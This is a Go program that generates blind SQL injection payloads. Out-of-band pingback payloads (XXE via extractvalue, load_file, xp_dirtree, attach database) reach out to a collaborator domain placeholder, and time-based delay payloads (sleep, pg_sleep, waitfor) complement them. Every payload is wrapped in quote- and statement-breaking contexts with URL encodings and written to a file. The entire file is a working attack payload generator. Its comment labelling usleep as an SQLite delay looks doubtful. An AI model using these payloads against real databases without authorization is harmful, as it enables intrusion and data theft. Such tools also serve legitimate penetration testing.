package main

import (
	"fmt"
	"net/url"
	"os"
	"strings"
)

// Payload construction components
var (
	// Expression wrapping templates for different injection contexts
	expressionEmbeddings = []func(string) string{
		func(s string) string { return `'||(` + s + `)||'` },
		func(s string) string { return `"||(` + s + `)||"` },
		func(s string) string { return `(` + s + `)` },
		func(s string) string { return s },
	}

	// Statement termination patterns for various SQL dialects
	statementEmbeddings = []func(string) string{
		func(s string) string { return `';` + s + `--` },
		func(s string) string { return `";` + s + `--` },
		func(s string) string { return `');` + s + `--` },
		func(s string) string { return `");` + s + `--` },
		func(s string) string { return s },
	}

	// Encoding handlers for different parameter contexts
	escapers = []func(string) string{
		func(s string) string { return s },          // Raw
		url.QueryEscape,                             // URL query encoding
		url.PathEscape,                              // URL path encoding
	}
)

// Convert expression to executable statement
func expressionToStatement(s string) string {
	return `select (` + s + `);`
}

// Placeholder for collaborator domain
const collabDomain = "{COLLAB_DOMAIN}"

// Generate OOB pingback payloads with domain placeholder
func generatePingbackPayloads() []string {
	var payloads []string

	// OOB detection templates with injection characteristics
	pingbackTemplates := []struct {
		template string    // Injection pattern
		escape   bool      // Whether to escape dots for SQL concatenation
	}{
		// XML External Entity (XXE) based detection
		{`extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %% nswjq SYSTEM "http://%s/">%%nswjq;]>'),'/l')`, true},
		
		// File operation based detection
		{`load_file('\\\\%s\\test')`, true},
		
		// SQL Server specific commands
		{`declare @q varchar(99);set @q='\\%s\\test'; exec master.dbo.xp_dirtree @q;`, true},
		{`attach database '\\\\%s\\test';`, true},
	}

	// Generate all payload variations
	for _, escaper := range escapers {
		for _, embed := range expressionEmbeddings {
			for _, tpl := range pingbackTemplates {
				domain := collabDomain
				if tpl.escape {
					domain = strings.ReplaceAll(domain, ".", "'||'.'||'")
				}
				raw := fmt.Sprintf(tpl.template, domain)
				payload := escaper(embed(raw))
				payloads = append(payloads, payload)
			}
		}
	}

	return unique(payloads)
}

// Generate time-based delay payloads (1-10 seconds)
func generateDelayPayloads() []string {
	var payloads []string

	// Database-specific delay patterns
	delayTemplates := []struct {
		template string  // Delay syntax template
		seconds  int     // Parameter position for seconds
	}{
		// MySQL sleep function
		{"sleep(%d)", 1},
		// SQLite pseudo-delay
		{"usleep(%d000000)", 1},
		// PostgreSQL sleep
		{"pg_sleep(%d)", 1},
		// SQL Server waitfor
		{"waitfor delay '00:00:%02d'", 1},
	}

	// Generate payloads for 1-10 second delays
	for seconds := 1; seconds <= 10; seconds++ {
		for _, escaper := range escapers {
			for _, embed := range expressionEmbeddings {
				for _, tpl := range delayTemplates {
					raw := fmt.Sprintf(tpl.template, seconds)
					if strings.Contains(raw, ")") {
						raw += "+1" // Maintain query validity
					}
					payload := escaper(embed(raw))
					payloads = append(payloads, payload)
				}
			}
		}
	}

	return unique(payloads)
}

// Deduplication utility function
func unique(strs []string) []string {
	seen := make(map[string]bool)
	result := []string{}
	for _, s := range strs {
		if !seen[s] {
			seen[s] = true
			result = append(result, s)
		}
	}
	return result
}

func main() {
	// Generate payload sets
	pingbacks := generatePingbackPayloads()
	delays := generateDelayPayloads()

	// Combine results
	allPayloads := append(pingbacks, delays...)

	// Create output file
	file, err := os.Create("sql_payloads.txt")
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Write payloads to file
	for _, p := range allPayloads {
		file.WriteString(p + "\n")
	}

	fmt.Printf("Generated %d payloads (OOB:%d | Time-based:%d)\n", 
		len(allPayloads), len(pingbacks), len(delays))
}
